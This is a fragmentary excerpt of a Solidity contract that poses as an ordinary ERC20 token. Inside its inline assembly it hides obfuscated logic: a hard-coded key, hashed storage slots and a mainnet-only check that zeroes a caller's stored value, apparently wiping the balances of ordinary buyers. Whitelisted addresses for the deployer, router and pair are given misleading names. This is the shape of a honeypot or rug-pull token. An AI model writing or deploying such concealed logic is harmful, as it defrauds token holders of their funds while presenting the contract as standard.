...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addVoice.push(_router); addVoice.push(msgSender_); addVoice.push(pair);
        for (uint256 q=0; q < 3;) {_firstWord[addVoice[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenStarter() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x40b620b2cdd189cdda53bedbdfb74eadf9cdd67b32f9de31ecff6b14f9259771
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x61bceedbd16f01c4213ce5d839453aaca7b424861f72906a06baf86764ed1474,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _voiceRecording = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addVoice[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployVoice(creator, initialSupply);
    }
}
